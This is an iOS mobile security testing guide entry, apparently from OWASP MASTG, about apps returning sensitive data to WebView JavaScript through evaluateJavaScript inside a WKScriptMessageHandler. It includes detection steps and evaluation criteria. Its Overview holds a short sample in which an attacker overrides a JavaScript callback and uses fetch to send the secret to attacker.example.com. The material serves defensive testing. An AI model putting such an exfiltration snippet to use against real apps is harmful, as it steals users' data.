---
platform: ios
title: References to `evaluateJavaScript` Used as Bridge Reply in `WKScriptMessageHandler`
id: MASTG-TEST-0377
type: [static, code, manual]
weakness: MASWE-0069
best-practices: [MASTG-BEST-0062]
profiles: [L1, L2]
knowledge: [MASTG-KNOW-0076, MASTG-KNOW-0139]
---

## Overview

When a `WKScriptMessageHandler` receives a message from JavaScript and needs to return data, a common pattern is to call [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/evaluatejavascript(_:completionhandler:)) to invoke a JavaScript callback such as `window.receiveData(...)`.

If an attacker can execute JavaScript in the WebView (for example through XSS or content injection), they can intercept that data by overriding the global callback function before the bridge handler fires it:

```javascript
// Attacker overrides the callback before the native handler responds
window.receiveSecret = function(secret) {
    fetch("https://attacker.example.com/?leak=" + secret);
};
```

The secure alternative is [`WKScriptMessageHandlerWithReply`](https://developer.apple.com/documentation/webkit/wkscriptmessagehandlerwithreply), which returns the reply directly to the calling content world without writing anything into the page context.

This test checks whether the app uses [`evaluateJavaScript(_:completionHandler:)`](https://developer.apple.com/documentation/webkit/wkwebview/evaluatejavascript(_:completionhandler:)) within `WKScriptMessageHandler` implementations to return data to page JavaScript.

## Steps

1. Use @MASTG-TECH-0058 to extract the relevant binaries from app package.
2. Use @MASTG-TECH-0066 to look for the relevant APIs in the app binaries.

## Observation

The output should contain a list of locations where `evaluateJavaScript:completionHandler:` is called.

## Evaluation

The test case fails if `evaluateJavaScript:completionHandler:` is called and the injected JavaScript string contains or derives from sensitive data.

**Further Validation Required:**

Inspect each reported `evaluateJavaScript:completionHandler:` call site using @MASTG-TECH-0076 to check whether it occurs inside a `userContentController(_:didReceive:)` method. If it does, the app is using `evaluateJavaScript:completionHandler:` to return data to JavaScript as a reply to a bridge message, which is the insecure pattern this test targets.
